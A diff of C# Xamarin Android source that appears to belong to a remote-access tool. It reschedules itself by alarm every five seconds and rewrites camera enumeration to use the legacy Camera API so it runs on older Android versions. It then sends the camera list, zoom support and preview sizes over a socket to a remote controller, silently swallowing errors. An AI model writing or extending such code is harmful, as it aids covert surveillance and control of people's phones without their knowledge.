@@ -551,7 +551,7 @@ namespace Task2
                 if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
                     am.SetExactAndAllowWhileIdle(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
                 else
-                    am.SetExact(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
+                    am.Set(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
             }
             catch (Exception) { }
         }
@@ -819,15 +819,23 @@ namespace Task2
         {
             try
             {
-                var cameraManager = (Android.Hardware.Camera2.CameraManager)GetSystemService(CameraService);
-                string[] IDs = cameraManager.GetCameraIdList();
+                /*
+                 * Android.Hardware.Camera is from API Level 1
+                 * Android.Hardware.Camera2 is from API Level 21 // This is not working under of API Level 21 :( 
+                 * Example: Android KitKat 4.4.2 API Level 19
+                 * So,
+                 * I saw that we can't access the nubmer of cameras in Api Level 19 (I tried on my Samsung tablet) because of Camera2 Api has been added in Api Level 21
+                 * thus I upadte it Android.Hardware.Camera from Android.Hardware.Camera2
+                 */
+                //Android.Hardware.Camera2 cameraManager = (Android.Hardware.Camera2)GetSystemService(CameraService);
+                int IDs = Android.Hardware.Camera.NumberOfCameras;
                 string gidecekler = default;
                 string cameralar = default;
                 string supZoom = default;
                 string previewsizes = default;
-                for (int i = 0; i < IDs.Length; i++)
+                for (int i = 0; i < IDs; i++)
                 {
-                    int cameraId = int.Parse(IDs[i]);
+                    int cameraId = i;
                     Android.Hardware.Camera.CameraInfo cameraInfo = new Android.Hardware.Camera.CameraInfo();
                     Android.Hardware.Camera.GetCameraInfo(cameraId, cameraInfo);
                     Android.Hardware.Camera camera = Android.Hardware.Camera.Open(cameraId);
@@ -854,17 +862,17 @@ namespace Task2
                             previewsizes += siz.Width.ToString() + "x" + siz.Height.ToString() + "<";
                         }
                     }
-                    cameralar += IDs[i] + "!";
+                    cameralar += cameraId.ToString() + "!";
                 }
                 byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes("[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}"));
                 Soketimiz.BeginSend(data, 0, data.Length, SocketFlags.None, null, null);
                 //soketimizeGonder("OLCULER", "[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}[VERI][0x09]");
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 try
                 {
-                    byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes("[VERI]Kameraya erişilemiyor."));
+                    byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes($"[VERI]An error occured while getting camera list:[NEW_LINE]{ex.Message.Replace(System.Environment.NewLine, "[NEW_LINE]")}"));
                     Soketimiz.BeginSend(data, 0, data.Length, SocketFlags.None, null, null);
                 }
                 catch (Exception) { }
